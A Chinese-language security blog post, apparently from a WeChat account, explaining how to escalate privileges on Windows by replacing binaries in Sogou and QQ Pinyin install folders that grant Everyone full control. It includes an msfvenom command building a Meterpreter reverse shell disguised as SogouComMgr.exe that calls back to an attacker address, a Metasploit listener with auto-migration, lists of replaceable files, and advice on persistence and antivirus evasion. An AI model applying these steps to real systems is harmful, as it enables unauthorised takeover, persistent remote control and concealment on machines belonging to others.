> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/R80F8I46CggdiknvmuEGJQ)
| 

**声明：**该公众号大部分文章来自作者日常学习笔记，也有少部分文章是经过原作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。

请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。

 |

**0x01 前言**

搜狗拼音输入法是目前国内使用人数最多的一款，但仍然会存在一些安全问题，在安装过程中默认给了 Everyone 完全控制权限，Everyone 为所有用户，也就是说我们可以对搜狗拼音输入法安装目录下的任何文件进行修改 / 删除和写入，所以能达到我们权限提升的目的。

虽然这种提权方式有些年头了，但不知道为什么搜狗一直没有修复这个问题。

**0x02 测试环境**

```
操作系统：Windows Server 2016 Datacenter
软件版本：搜狗拼音输入法 9.5.0.3517、QQ拼音输入法6.4.5804.400
搜狗拼音默认安装路径：C:\Program Files (x86)\SogouInput\
QQ拼音默认安装路径：C:\Program Files (x86)\Tencent\QQPinyin\
搜狗、QQ输入法进程名：SGTool.exe、SGDownload.exe、pinyinup.exe、SogouCloud.exe、SogouComMgr.exe、SGRender.exe、QQPYUserCenter.exe、QQPYLiveUp.exe、QQPYConfig.exe、QQPYToolbox.exe、QQPYCloud.exe......
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdBctkHcAAeiaQUDGdJWhMBxicrk34EtxsI2O88kBd0QbMJlfiaRfQK977LltAhiaziannRSCicqHRxPXicw/640?wx_fmt=png)

**0x03 搜狗拼音输入法**

使用 tasklist /svc 命令查看搜狗相关进程，或者直接跳转到 %ProgramFiles(x86)% 目录下看是否安装的有搜狗输入法。  

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdBctkHcAAeiaQUDGdJWhMBxN8MCiblAtQyspUFLmicSNQOkbPCexUKwFY4EiblibUH5dyAOdY8BDC7Pow/640?wx_fmt=png)

接着再用 icacls 命令查看搜狗输入法安装目录 C:\Program Files (x86)\SogouInput\9.5.0.3517\ 的权限配置。

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdBctkHcAAeiaQUDGdJWhMBxyOenzndBTq8NvqPsvRV2aiar5Hq9VVwb2Ie7IBNSB7Xqu4Tk04lt7pA/640?wx_fmt=png)

**官方文档：**https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc753525(v=ws.11)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdBctkHcAAeiaQUDGdJWhMBxicqwspfRotY1WK6VFOcL4FWO8rdwmpZxN8uWkmIalxJngrMh1f4sBpA/640?wx_fmt=png)

确定搜狗输入法安装目录具备 Everyone 完全控制权限后就可以生成 MSF 攻击载荷并设置好相关参数执行监听，然后替换目标机器常用的搜狗相关文件，等管理员使用搜狗输入法时运行到我们替换的文件即可得到会话。

```
root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.0.120 lport=443 -f exe > /var/www/html/SogouComMgr.exe

msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > set lhost 192.168.0.120
msf5 exploit(multi/handler) > set lport 443
msf5 exploit(multi/handler) > set autorunscript post/windows/manage/migrate NAME=notepad.exe
msf5 exploit(multi/handler) > exploit
```

**其它搜狗拼音输入法可替换文件：**

```
搜狗输入法 - 属性设置工具：
%ProgramFiles(x86)%\SogouInput\9.5.0.3517\SGTool.exe 
搜狗输入法 - 修复更新工具：
%ProgramFiles(x86)%\SogouInput\9.5.0.3517\SGDownload.exe
搜狗输入法 - 网络更新程序：
%ProgramFiles(x86)%\SogouInput\9.5.0.3517\pinyinup.exe
搜狗输入法 - 云计算代理：
%ProgramFiles(x86)%\SogouInput\9.5.0.3517\SogouCloud.exe
搜狗输入法 - 云计算代理：
%ProgramFiles(x86)%\SogouInput\9.5.0.3517\SearchCand.dll
搜狗输入法 - 工具箱：
%ProgramFiles(x86)%\SogouInput\Components\SogouComMgr.exe
搜狗输入法 - 用户登录：
%ProgramFiles(x86)%\SogouInput\Components\SGRender\1.0.0.56\SGRender.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdBctkHcAAeiaQUDGdJWhMBxLP2aIGnQx7KDTjPPmTQu25cvLQWlj8rMFU3OASC52S8IvYCTro7xTg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdBctkHcAAeiaQUDGdJWhMBxeNicibKu1Nr0iaia7Eba9zjWuuPSzftLC04nVYNmegrpicbfpnrjnKxo2jQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdBctkHcAAeiaQUDGdJWhMBx6fR234vl9rv3tquHRLKUBNUcvNGE3ukInA3P8JCo7cb8T0LEicr1QvQ/640?wx_fmt=png)

**0x04 搜狗拼音输入法**

QQ 拼音个人中心 QQPYUserCenter.exe 被我们替换后直接切换到 QQ 拼音输入法即可得到 Meterpreter 会话，其它文件可能还得等管理员执行相应操作后才能得到会话。

```
QQ拼音输入法 - 个人中心：

%ProgramFiles(x86)%\Tencent\QQPinyin\6.4.5804.400\QQPYUserCenter.exe
QQ拼音输入法 - 升级工具：
%ProgramFiles(x86)%\Tencent\QQPinyin\6.4.5804.400\QQPYLiveUp.exe
QQ拼音输入法 - 属性设置：
%ProgramFiles(x86)%\Tencent\QQPinyin\6.4.5804.400\QQPYConfig.exe
QQ拼音输入法 - 工具箱：
%ProgramFiles(x86)%\Tencent\QQPinyin\6.4.5804.400\QQPYToolbox.exe
QQ拼音云输入 - 客户端：
%ProgramFiles(x86)%\Tencent\QQPinyin\6.4.5804.400\QQPYCloud.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdBctkHcAAeiaQUDGdJWhMBxQ32vVl5FcqV4xptc9czm4mniaoPMYk3rtxymam9hIBbUU8vBsA8Y2vw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOdBctkHcAAeiaQUDGdJWhMBxk8scSCZMoMnC2KGp18rA3KSzMCRgvw7IcGhYvVBWxrp2UnAiamqUUvA/640?wx_fmt=png)

**0x05 注意事项**

1.  如果目标机器为 XP、2003 系统的话我们就可以直接利用 lpk.dll 劫持来进行权限提升可能会更好；  
    
2.  替换文件前要先备份好我们要替换的搜狗拼音输入法相关文件，便于我们后期将其恢复到原始状态；
    
3.  最终获取的 Meterpreter 会话权限取决于目标服务器登录的是哪个用户来执行我们的搜狗拼音输入法；
    
4.  同时也可以利用目标机器上的搜狗、QQ 等输入法来进行权限维持，有安全防护还得自己做下免杀处理；
    
5.  防止替换后的文件在运行后就退出而导致 Meterpreter 会话断开，笔者建议用 migrate 模块注入到其它进程中运行；
    

关注公众号回复 “9527” 可免费获取一套 HTB 靶场文档和视频，“1120” 安全参考等安全杂志 PDF 电子版，“1208” 个人常用高效爆破字典，“0221”2020 年酒仙桥文章打包，还在等什么？赶紧点击下方名片关注学习吧！

公众号

* * *

**推 荐 阅 读**

  

  

  

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcAcRDPBsTMEQ0pGhzmYrBp7pvhtHnb0sJiaBzhHIILwpLtxYnPjqKmibA/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247487086&idx=1&sn=37fa19dd8ddad930c0d60c84e63f7892&chksm=cfa6aa7df8d1236bb49410e03a1678d69d43014893a597a6690a9a97af6eb06c93e860aa6836&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf1BEGicRSpVMRDuaANDvrLcIJDWu9lMmvjKulJ1TxiavKVzyum8jfLVjSYI21rq57uueQafg0LSTCA/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486961&idx=1&sn=d02db4cfe2bdf3027415c76d17375f50&chksm=cfa6a9e2f8d120f4c9e4d8f1a7cd50a1121253cb28cc3222595e268bd869effcbb09658221ec&scene=21#wechat_redirect)

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOf8eyzKWPF5pVok5vsp74xolhlyLt6UPab7jQddW6ywSs7ibSeMAiae8TXWjHyej0rmzO5iaZCYicSgxg/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247486327&idx=1&sn=71fc57dc96c7e3b1806993ad0a12794a&chksm=cfa6af64f8d1267259efd56edab4ad3cd43331ec53d3e029311bae1da987b2319a3cb9c0970e&scene=21#wechat_redirect)

**欢 迎 私 下 骚 扰**

  

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/XOPdGZ2MYOdSMdwH23ehXbQrbUlOvt6Y0G8fqI9wh7f3J29AHLwmxjIicpxcjiaF2icmzsFu0QYcteUg93sgeWGpA/640?wx_fmt=jpeg)